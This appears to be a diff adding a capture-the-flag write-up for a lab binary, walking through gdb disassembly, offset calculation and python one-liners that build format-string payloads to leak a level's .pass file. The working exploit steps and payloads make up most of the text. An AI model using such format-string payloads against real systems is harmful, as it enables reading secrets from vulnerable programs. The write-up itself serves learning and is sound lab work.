@@ -1,0 +1,44 @@
+
+=> To test this binary we need to copy it and modify the level of the file
+file_pass = fopen("/home/users/level03/.pass", "r"); replace "level03" to "level02"
+
+=> We see a vulnerabilty at the end of the file, print is called with our input 
+=> We can exploit a format string exploit, let's try to read the data in the buff_flag
+=> Break before the printf
+=> Check the assembly code and see that buff_flag is at [rbp - 0xa0]
+for exemple before the fread, addr is loaded with LEA 
+   0x00000000004008e6 <+210>:	lea    -0xa0(%rbp),%rax
+   0x00000000004008ed <+217>:	mov    -0x8(%rbp),%rdx
+   0x00000000004008f1 <+221>:	mov    %rdx,%rcx
+   0x00000000004008f4 <+224>:	mov    $0x29,%edx
+   0x00000000004008f9 <+229>:	mov    $0x1,%esi
+   0x00000000004008fe <+234>:	mov    %rax,%rdi
+   0x0000000000400901 <+237>:	callq  0x400690 <fread@plt>
+
+=> We found this address: 0x7fffffffe460 
+(gdb) x $rbp - 0xa0
+0x7fffffffe460: xxxxxxxxx
+
+=> Then let's calcul the offset 
+=> The address is the 28th address
+=> Super ! Let's create the format string 
+r < <(python -c 'print "\x60\xe4\xff\xff\xff\x7f" + "%28$s"')
+
+=> Problem, We have a SEGFAULT ! It's because on the stack, if we print the address we have a 
+x/50gx $rsp (display value 8 bytes)
+...
+0x7fffffffe490:	0x32257fffffffe460	0x0000000000732438
+...
+
+=> Our address is 8 bytes long on 64 bits system, we write 6 / 8 bytes
+=> We can't add null bytes (\x00) like: "\x60\xe4\xff\xff\xff\x7f\x00\x00" + "%28$s" 
+because printf will stop and ignore the rest
+
+=> Let's put the put the address at the end then:
+python -c 'print "%29$s" + "\x60\xe4\xff\xff\xff\x7f"' 
+
+=> This time we will create a padding of spaces like %[numbers 0]$s to align the address
+
+python -c 'print "%00029$s" + "\x40\xe4\xff\xff\xff\x7f"'
+
+=> We have a token, take care to ignore the @ at the end 
